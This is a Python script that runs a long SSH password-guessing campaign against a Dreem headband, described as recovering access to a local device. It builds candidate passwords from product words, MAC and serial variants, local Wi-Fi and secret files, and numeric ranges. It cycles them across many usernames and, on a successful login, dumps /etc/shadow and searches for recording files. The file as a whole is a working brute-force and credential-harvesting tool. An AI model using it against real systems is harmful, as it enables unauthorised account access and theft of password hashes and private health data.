#!/usr/bin/env python3
"""
Bounded SSH password-recovery campaign for the local Dreem headband.

The script deliberately avoids printing candidate passwords. It stores a
chmod-600 passlist and logs only candidate index/hash/length/source.
"""

from __future__ import annotations

import argparse
import hashlib
import json
import os
import random
import re
import socket
import stat
import sys
import time
from dataclasses import dataclass
from datetime import datetime, timezone
from pathlib import Path
from typing import Iterable

import paramiko


REPO_ROOT = Path(__file__).resolve().parents[3]
DEFAULT_USERS = [
    "root",
    "admin",
    "dreem",
    "rythm",
    "factory",
    "service",
    "support",
    "debug",
    "operator",
    "nerves",
    "alarm",
    "ubuntu",
    "debian",
    "pi",
    "codex",
]

PRIMARY_USERS = ["root", "admin", "dreem", "rythm", "factory", "service"]


@dataclass(frozen=True)
class Candidate:
    value: str
    source: str

    @property
    def digest(self) -> str:
        return hashlib.sha256(self.value.encode("utf-8", "surrogatepass")).hexdigest()[:16]


def utc_now() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ")


def chmod_600(path: Path) -> None:
    try:
        path.chmod(stat.S_IRUSR | stat.S_IWUSR)
    except OSError:
        pass


def add_candidate(out: list[Candidate], seen: set[str], value: str | None, source: str) -> None:
    if value is None:
        return
    value = value.strip("\r\n")
    if not value:
        return
    if "\x00" in value:
        return
    if len(value) > 128:
        return
    if value in seen:
        return
    seen.add(value)
    out.append(Candidate(value=value, source=source))


def read_secret_files(base: Path) -> list[Candidate]:
    out: list[Candidate] = []
    seen: set[str] = set()
    secret_paths: list[Path] = []
    secret_paths.extend(sorted((base / "extracted" / "ssh_fuse_candidates").glob("*.pw")))
    secret_paths.extend(sorted(base.glob("headband-pass.*")))
    wifi_file = base / "wifi.txt"
    if wifi_file.exists():
        secret_paths.append(wifi_file)

    for path in secret_paths:
        try:
            text = path.read_text(encoding="utf-8", errors="ignore")
        except OSError:
            continue
        source = f"secret-file:{path.name}"
        for line in text.splitlines():
            stripped = line.strip()
            if not stripped or stripped.startswith("#"):
                continue
            add_candidate(out, seen, stripped, source)
            for match in re.finditer(r"(?:password|pass|psk|key)\s*[:=]\s*([^,\s]+)", stripped, re.I):
                add_candidate(out, seen, match.group(1).strip("\"'"), source)
            for match in re.finditer(r"^(?:password|pass|psk|key)\s+(.+)$", stripped, re.I):
                add_candidate(out, seen, match.group(1).strip("\"'"), source)
    return out


def mac_variants(mac: str) -> list[str]:
    raw = re.sub(r"[^0-9a-fA-F]", "", mac).lower()
    if len(raw) != 12:
        return []
    colon = ":".join(raw[i : i + 2] for i in range(0, 12, 2))
    hyphen = "-".join(raw[i : i + 2] for i in range(0, 12, 2))
    chunks = [
        raw,
        raw.upper(),
        colon,
        colon.upper(),
        hyphen,
        hyphen.upper(),
        raw[-4:],
        raw[-6:],
        raw[-8:],
        raw[:6],
        raw[6:],
    ]
    return list(dict.fromkeys(chunks))


def case_variants(word: str) -> list[str]:
    vals = {word, word.lower(), word.upper(), word.capitalize()}
    if len(word) > 1:
        vals.add(word[0].upper() + word[1:].lower())
    return [v for v in vals if v]


def generate_candidates(base: Path) -> list[Candidate]:
    out: list[Candidate] = []
    seen: set[str] = set()

    for cand in read_secret_files(base):
        add_candidate(out, seen, cand.value, cand.source)

    product_words = [
        "root",
        "toor",
        "admin",
        "password",
        "pass",
        "default",
        "factory",
        "service",
        "support",
        "debug",
        "test",
        "qwerty",
        "1234",
        "12345",
        "123456",
        "12345678",
        "0000",
        "000000",
        "1111",
        "dreem",
        "dreem2",
        "dreem3",
        "Dreem",
        "Dreem2",
        "rythm",
        "Rythm",
        "rythm.co",
        "Rythm.co",
        "headband",
        "sleep",
        "alfin",
        "connect",
        "morphee",
        "morpheus",
        "nerves",
        "alarm",
        "imx6",
        "imx6ull",
        "mx6ull",
        "linux",
        "dropbear",
        "kingston",
        "04EMCP04",
        "04emcp04",
        "2AH2QDREEM2",
        "2AH2Q-DREEM2",
    ]
    for word in product_words:
        add_candidate(out, seen, word, "base-word")

    years = ["2016", "2017", "2018", "2019", "2020", "2021", "2022", "2023", "2024", "2025", "2026"]
    suffixes = ["", "!", "@", "#", "1", "12", "123", "1234", "01", "02"] + years
    prefixes = ["", "!", "@", "#"]
    core_words = ["dreem", "Dreem", "rythm", "Rythm", "admin", "root", "factory", "service", "debug", "headband"]
    for word in core_words:
        for suffix in suffixes:
            add_candidate(out, seen, f"{word}{suffix}", "word-suffix")
        for prefix in prefixes:
            if prefix:
                add_candidate(out, seen, f"{prefix}{word}", "word-prefix")

    macs = [
        "AA:BB:CC:DD:EE:50",
        "AA:BB:CC:DD:EE:4F",
    ]
    for mac in macs:
        for variant in mac_variants(mac):
            add_candidate(out, seen, variant, "mac")
            for word in ["dreem", "Dreem", "rythm", "Rythm", "root", "admin"]:
                add_candidate(out, seen, f"{word}{variant}", "word-mac")
                add_candidate(out, seen, f"{variant}{word}", "mac-word")
                add_candidate(out, seen, f"{word}-{variant}", "word-mac")
                add_candidate(out, seen, f"{word}_{variant}", "word-mac")

    serialish = [
        "aabbccddee50",
        "aabbccddee4f",
        "ddee50",
        "ddee4f",
        "ee50",
        "ee4f",
        "04EMCP04NL2DM627",
        "04emcp04nl2dm627",
        "2400777002A00GA",
        "2400777-002.A00G-A",
        "MCIMX6Y1",
        "DVK05AB",
        "1N70S",
    ]
    for item in serialish:
        for variant in case_variants(item):
            add_candidate(out, seen, variant, "serialish")
            for word in ["dreem", "Dreem", "rythm", "Rythm"]:
                add_candidate(out, seen, f"{word}{variant}", "word-serialish")

    # Common compact numeric PIN/password space often used for factory devices.
    # Keep it behind product-derived candidates but large enough to occupy time.
    for width in [4, 6]:
        upper = 10**width
        for n in range(upper):
            s = f"{n:0{width}d}"
            add_candidate(out, seen, s, f"numeric-{width}")
            if width == 4 and n == 9999:
                break
            if width == 6 and n == 49999:
                break

    # Add a deterministic sample of mixed word+small-number combinations.
    for word in ["dreem", "Dreem", "rythm", "Rythm", "root", "admin", "factory", "service"]:
        for n in range(0, 10000):
            for sep in ["", "-", "_"]:
                add_candidate(out, seen, f"{word}{sep}{n:04d}", "word-4digit")

    return out


def write_candidates(out_dir: Path, candidates: list[Candidate]) -> None:
    secret_path = out_dir / "candidates.secret"
    meta_path = out_dir / "candidates.tsv"
    with secret_path.open("w", encoding="utf-8") as f:
        for cand in candidates:
            f.write(cand.value + "\n")
    chmod_600(secret_path)
    with meta_path.open("w", encoding="utf-8") as f:
        f.write("index\tsha256_16\tlength\tsource\n")
        for i, cand in enumerate(candidates):
            f.write(f"{i}\t{cand.digest}\t{len(cand.value)}\t{cand.source}\n")


def tcp_open(ip: str, port: int, timeout: float = 2.0) -> bool:
    try:
        with socket.create_connection((ip, port), timeout=timeout) as sock:
            sock.settimeout(timeout)
            banner = sock.recv(32)
            return banner.startswith(b"SSH-")
    except OSError:
        return False
    except socket.timeout:
        return False


def build_pairs(users: list[str], candidates: list[Candidate]) -> list[tuple[str, int]]:
    pairs: list[tuple[str, int]] = []
    seen: set[tuple[str, int]] = set()

    def add_pair(user: str, idx: int) -> None:
        key = (user, idx)
        if key in seen:
            return
        seen.add(key)
        pairs.append(key)

    top_n = min(300, len(candidates))
    for idx in range(top_n):
        for user in users:
            add_pair(user, idx)

    for user in [u for u in PRIMARY_USERS if u in users]:
        for idx in range(len(candidates)):
            add_pair(user, idx)

    for user in users:
        for idx in range(len(candidates)):
            add_pair(user, idx)

    return pairs


def load_json(path: Path, default: dict) -> dict:
    try:
        return json.loads(path.read_text(encoding="utf-8"))
    except (OSError, json.JSONDecodeError):
        return default.copy()


def save_json(path: Path, data: dict) -> None:
    tmp = path.with_suffix(path.suffix + ".tmp")
    tmp.write_text(json.dumps(data, indent=2, sort_keys=True) + "\n", encoding="utf-8")
    tmp.replace(path)


def log_line(path: Path, message: str) -> None:
    with path.open("a", encoding="utf-8") as f:
        f.write(f"{utc_now()} {message}\n")


def attempt_ssh(ip: str, port: int, user: str, password: str, timeout_s: float) -> tuple[bool, str, str]:
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(
            ip,
            port=port,
            username=user,
            password=password,
            look_for_keys=False,
            allow_agent=False,
            timeout=timeout_s,
            banner_timeout=timeout_s,
            auth_timeout=timeout_s,
        )
        stdin, stdout, stderr = client.exec_command(
            "echo SSH_SUCCESS; id; uname -a; "
            "echo --shadow--; (cat /etc/shadow 2>/dev/null || true); "
            "echo --files--; find / -type f \\( -iname '*.h5' -o -iname '*.hdf5' -o -iname '*.hdf' "
            "-o -iname '*record*' -o -iname '*night*' -o -iname '*report*' \\) 2>/dev/null | head -n 500",
            timeout=20,
        )
        out = stdout.read().decode("utf-8", "replace")
        err = stderr.read().decode("utf-8", "replace")
        return ("SSH_SUCCESS" in out), out, err
    except paramiko.AuthenticationException:
        return False, "", "auth-failed"
    except Exception as exc:
        return False, "", f"{type(exc).__name__}: {exc}"
    finally:
        try:
            client.close()
        except Exception:
            pass


def run(args: argparse.Namespace) -> int:
    base = Path(args.base).expanduser().resolve()
    run_root = Path(args.out_root).expanduser()
    run_root.mkdir(parents=True, exist_ok=True)
    out_dir = run_root / f"dreem_ssh_password_campaign_{datetime.now(timezone.utc).strftime('%Y%m%dT%H%M%SZ')}"
    out_dir.mkdir(parents=True, exist_ok=True)

    log_path = out_dir / "campaign.log"
    attempts_path = out_dir / "attempts.tsv"
    state_path = out_dir / "state.json"
    stop_path = out_dir / "STOP"

    candidates = generate_candidates(base)
    users = args.users.split(",") if args.users else DEFAULT_USERS
    users = [u.strip() for u in users if u.strip()]
    pairs = build_pairs(users, candidates)

    write_candidates(out_dir, candidates)
    attempts_path.write_text("utc\tattempt\tpair_index\tuser\tcandidate_index\tsha256_16\tlength\tsource\tresult\tdetail\n", encoding="utf-8")
    meta = {
        "ip": args.ip,
        "port": args.port,
        "created_utc": utc_now(),
        "duration_seconds": args.duration_seconds,
        "active_seconds": args.active_seconds,
        "delay_seconds": args.delay_seconds,
        "start_pair": args.start_pair,
        "precheck_every": args.precheck_every,
        "precheck_timeout_seconds": args.precheck_timeout_seconds,
        "candidate_count": len(candidates),
        "user_count": len(users),
        "pair_count": len(pairs),
        "users": users,
        "pid": os.getpid(),
        "out_dir": str(out_dir),
    }
    save_json(out_dir / "manifest.json", meta)

    if args.dry_run:
        print(json.dumps(meta, indent=2, sort_keys=True))
        return 0

    log_line(log_path, f"start ip={args.ip} port={args.port} out={out_dir}")
    log_line(log_path, f"candidates={len(candidates)} users={len(users)} pairs={len(pairs)}")

    started = time.monotonic()
    deadline = started + args.duration_seconds if args.duration_seconds > 0 else None
    active_deadline = None
    next_pair = max(0, min(args.start_pair, len(pairs)))
    attempts = 0
    offline_last_log = 0.0
    force_precheck = True
    if next_pair:
        log_line(log_path, f"resume start_pair={next_pair}")

    while True:
        now = time.monotonic()
        if deadline is not None and now >= deadline:
            log_line(log_path, "stop reason=wall-time-expired")
            return 3
        if active_deadline is not None and now >= active_deadline:
            log_line(log_path, "stop reason=active-time-expired")
            return 4
        if stop_path.exists():
            log_line(log_path, f"stop reason=STOP-file path={stop_path}")
            return 5
        if next_pair >= len(pairs):
            log_line(log_path, "stop reason=candidates-exhausted")
            return 6

        should_precheck = force_precheck or (args.precheck_every > 0 and attempts % args.precheck_every == 0)
        if should_precheck:
            if not tcp_open(args.ip, args.port, timeout=args.precheck_timeout_seconds):
                if now - offline_last_log > 60:
                    log_line(log_path, f"waiting_for_ssh ip={args.ip} port={args.port}")
                    offline_last_log = now
                force_precheck = True
                time.sleep(args.offline_sleep_seconds)
                continue
            force_precheck = False

        if active_deadline is None and args.active_seconds > 0:
            active_deadline = time.monotonic() + args.active_seconds
            log_line(log_path, f"ssh_seen active_deadline_utc={datetime.fromtimestamp(time.time() + args.active_seconds, timezone.utc).strftime('%Y-%m-%dT%H:%M:%SZ')}")

        user, cand_idx = pairs[next_pair]
        cand = candidates[cand_idx]
        result = "unknown"
        detail = ""
        success, stdout_text, stderr_text = attempt_ssh(args.ip, args.port, user, cand.value, args.auth_timeout_seconds)
        attempts += 1
        if success:
            result = "success"
            detail = "authenticated"
            (out_dir / "success_stdout.txt").write_text(stdout_text, encoding="utf-8", errors="replace")
            (out_dir / "success_stderr.txt").write_text(stderr_text, encoding="utf-8", errors="replace")
            secret = out_dir / "success.secret"
            secret.write_text(f"user={user}\npassword={cand.value}\n", encoding="utf-8")
            chmod_600(secret)
            log_line(log_path, f"SUCCESS user={user} candidate_index={cand_idx} sha256_16={cand.digest}")
        else:
            result = "fail" if stderr_text == "auth-failed" else "transient"
            detail = stderr_text.replace("\t", " ").replace("\n", " ")[:180]

        with attempts_path.open("a", encoding="utf-8") as f:
            f.write(
                f"{utc_now()}\t{attempts}\t{next_pair}\t{user}\t{cand_idx}\t"
                f"{cand.digest}\t{len(cand.value)}\t{cand.source}\t{result}\t{detail}\n"
            )

        state = {
            "updated_utc": utc_now(),
            "attempts": attempts,
            "next_pair": next_pair + (1 if result == "fail" else 0),
            "last_user": user,
            "last_candidate_index": cand_idx,
            "last_candidate_sha256_16": cand.digest,
        }
        save_json(state_path, state)

        if success:
            return 0

        if result == "transient":
            log_line(log_path, f"transient attempts={attempts} pair={next_pair} detail={detail}")
            force_precheck = True
            time.sleep(max(args.offline_sleep_seconds, 2.0))
            continue

        next_pair += 1
        if attempts % args.status_every == 0:
            log_line(log_path, f"progress attempts={attempts} next_pair={next_pair} last_user={user} last_candidate_index={cand_idx}")
        if args.delay_seconds > 0:
            time.sleep(args.delay_seconds + random.uniform(0, min(0.25, args.delay_seconds)))


def main(argv: list[str]) -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--ip", default="192.0.2.148")
    parser.add_argument("--port", type=int, default=22)
    parser.add_argument("--base", default=str(REPO_ROOT / "private" / "ssh-password-inputs"))
    parser.add_argument("--out-root", default=str(REPO_ROOT / "evidence" / "ssh-password-campaigns"))
    parser.add_argument("--users", default=",".join(DEFAULT_USERS))
    parser.add_argument("--duration-seconds", type=int, default=30 * 3600)
    parser.add_argument("--active-seconds", type=int, default=24 * 3600)
    parser.add_argument("--delay-seconds", type=float, default=0.5)
    parser.add_argument("--offline-sleep-seconds", type=float, default=10.0)
    parser.add_argument("--auth-timeout-seconds", type=float, default=8.0)
    parser.add_argument("--status-every", type=int, default=100)
    parser.add_argument("--start-pair", type=int, default=0)
    parser.add_argument("--precheck-every", type=int, default=1)
    parser.add_argument("--precheck-timeout-seconds", type=float, default=2.0)
    parser.add_argument("--dry-run", action="store_true")
    args = parser.parse_args(argv)
    return run(args)


if __name__ == "__main__":
    raise SystemExit(main(sys.argv[1:]))
